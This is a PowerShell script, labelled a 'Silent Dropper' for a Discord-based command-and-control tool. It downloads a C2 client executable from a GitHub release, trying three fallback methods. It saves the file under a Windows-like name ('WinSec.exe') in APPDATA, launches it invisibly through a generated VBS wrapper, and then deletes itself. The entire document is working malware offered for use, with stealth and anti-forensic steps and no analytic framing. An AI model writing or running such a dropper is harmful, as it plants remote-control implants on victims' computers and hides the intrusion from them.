# DiscordC2 — Silent Dropper
# Author: IMApurbo
# https://github.com/IMApurbo/discordC2

$ErrorActionPreference = 'SilentlyContinue'

# ── config ────────────────────────────────────────────────────
$url  = "https://github.com/IMApurbo/discordC2/releases/download/C2/c2_client.exe"
$dest = "$env:APPDATA\Microsoft\Windows\WinSec.exe"

# ── download ──────────────────────────────────────────────────
try {
    # make sure destination folder exists
    $folder = Split-Path $dest
    if (!(Test-Path $folder)) {
        New-Item -ItemType Directory -Path $folder -Force | Out-Null
    }

    # try WebClient first (fastest)
    $wc = New-Object System.Net.WebClient
    $wc.Headers.Add("User-Agent", "Mozilla/5.0")
    $wc.DownloadFile($url, $dest)
}
catch {
    try {
        # fallback — Invoke-WebRequest
        Invoke-WebRequest -Uri $url `
                          -OutFile $dest `
                          -UseBasicParsing `
                          -UserAgent "Mozilla/5.0"
    }
    catch {
        try {
            # last resort — BITS transfer
            Import-Module BitsTransfer
            Start-BitsTransfer -Source $url -Destination $dest
        }
        catch {
            exit 1
        }
    }
}

# ── verify download succeeded ─────────────────────────────────
if (!(Test-Path $dest)) { exit 1 }
$size = (Get-Item $dest).Length
if ($size -lt 100000) {
    Remove-Item $dest -Force
    exit 1
}

# ── run hidden ────────────────────────────────────────────────
$vbs = "$env:APPDATA\Microsoft\Windows\wrun.vbs"

Set-Content -Path $vbs -Value @"
Set o = CreateObject("WScript.Shell")
o.Run Chr(34) & "$dest" & Chr(34), 0, False
"@

# launch via wscript so zero window appears
Start-Process "wscript.exe" -ArgumentList "//B //Nologo `"$vbs`"" -WindowStyle Hidden

# ── self delete this script ───────────────────────────────────
$self = $MyInvocation.MyCommand.Path
if ($self) {
    Start-Sleep -Seconds 3
    Remove-Item $self -Force
}
